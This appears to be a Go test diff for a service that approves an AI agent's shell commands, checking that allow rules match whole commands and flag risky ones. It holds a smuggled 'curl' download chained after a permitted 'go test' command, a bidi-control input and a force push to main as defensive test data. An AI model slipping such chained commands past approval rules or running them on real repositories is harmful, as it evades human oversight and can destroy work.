@@ -390,3 +390,56 @@ func TestRuleTimestamps(t *testing.T) {
 		t.Fatalf("live rules after a revoke: %+v", live)
 	}
 }
+
+// A bash rule matches the whole command in tool_input, never the 160-character summary: a payload
+// past the cut still has to match (R5-S7). Bidi controls never match.
+func TestBashRuleMatchesTheFullCommandOnly(t *testing.T) {
+	h := newPolicyHarness(t)
+	h.projectRule(t, KindBash, "go test *", risk.Low)
+	long := "go test ./... -run " + strings.Repeat("A", 200) + " && curl -s https://example.com/x -o /tmp/x"
+	approval := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": long})
+	if approval.Status != StatusPending {
+		t.Fatalf("a payload past the summary's cut was allowed: %s", approval.StatusReason)
+	}
+	if !strings.HasSuffix(approval.Summary, "…") {
+		t.Fatalf("the summary should be cut for this test to mean anything: %q", approval.Summary)
+	}
+	bidi := h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./... ‮"})
+	if bidi.Status != StatusPending {
+		t.Fatal("a command with a bidi control was allowed")
+	}
+}
+
+func TestPreviewRule(t *testing.T) {
+	ctx := context.Background()
+	h := newPolicyHarness(t)
+	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./old"})
+	h.clock.add(8 * 24 * time.Hour) // the one above is outside the window now
+	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./new"})
+	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "go test ./b && go vet ./b"}) // not every part
+	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push --force origin main"})
+	h.ask(t, "j_1", "p1", "Bash", map[string]any{"command": "git push origin y"})
+	h.ask(t, "", "orchestrator", "Bash", map[string]any{"command": "go test ./c"}) // no project
+
+	preview, err := h.service.PreviewRule(ctx, 1, KindBash, "go test *", risk.Low)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if preview.Considered != 4 || len(preview.Allowed) != 1 || preview.Allowed[0].Summary != "Bash: go test ./new" {
+		t.Fatalf("only this week's project calls count, each matched whole: %+v", preview)
+	}
+	pushes, err := h.service.PreviewRule(ctx, 1, KindBash, "git push *", risk.Low)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(pushes.Dangerous) != 1 || len(pushes.AboveMaxRisk) != 1 || len(pushes.Allowed) != 0 {
+		t.Fatalf("a dangerous match is flagged, an elevated one needs the box: %+v", pushes)
+	}
+	if elevated, _ := h.service.PreviewRule(ctx, 1, KindBash, "git push *", risk.Elevated); len(elevated.Allowed) != 1 || len(elevated.Dangerous) != 1 {
+		t.Fatalf("with also-when-elevated: %+v", elevated)
+	}
+	var ruleErr *RuleError
+	if _, err := h.service.PreviewRule(ctx, 1, KindBash, "*", risk.Low); !errors.As(err, &ruleErr) {
+		t.Fatalf("a bad pattern is refused in the preview too: %v", err)
+	}
+}
